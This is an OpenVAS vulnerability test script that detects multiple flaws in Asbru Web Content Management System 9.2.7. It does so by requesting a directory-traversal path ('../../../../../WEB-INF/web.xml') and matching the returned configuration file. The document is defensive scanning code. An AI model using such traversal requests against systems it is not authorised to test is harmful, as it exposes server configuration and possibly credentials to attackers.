###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_asbru_web_content_mgnt_sys_mult_vuln.nasl 11725 2018-10-02 10:50:50Z asteins $
#
# Asbru Web Content Management System Multiple Vulnerabilities
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:asbru_web_content_management_system:asbru";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807656");
  script_version("$Revision: 11725 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-02 12:50:50 +0200 (Tue, 02 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-04-12 17:30:16 +0530 (Tue, 12 Apr 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Asbru Web Content Management System Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host is running Asbru Web Content
  Management System and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET method
  and check whether it is able to read 'web.xml' file.");

  script_tag(name:"insight", value:"Multiple flaws are due to

  - An improper validation of user-supplied input by the create_post.jsp script.

  - An open redirect vulnerability in the login_post.jsp script.

  - An improper validation of requests which contains 'dot dot' sequences.

  - A cross-site request forgery vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to traverse directories on the system, to redirect a victim to
  arbitrary Web sites, to steal the victim's cookie-based authentication
  credentials, and other malicious activities.");

  script_tag(name:"affected", value:"Asbru Web Content Management System 9.2.7");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39667");

  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_asbru_web_content_mgnt_sys_detect.nasl");
  script_mandatory_keys("Asbru/Installed");
  script_require_ports("Services/www", 443);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!asbPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:asbPort)){
  exit(0);
}

if(dir == "/"){
  dir = "";
}

url = dir + "/../../../../../WEB-INF/web.xml";

if(http_vuln_check(port:asbPort, url:url, check_header:TRUE,
   pattern:"<display-name>Asbru Web Content Management System</display-name>",
   extra_check:make_list(">GET<", ">POST<", ">Configuration file<")))
{
  report = report_vuln_url( port:asbPort, url:url );
  security_message(port:asbPort, data:report);
  exit(0);
}
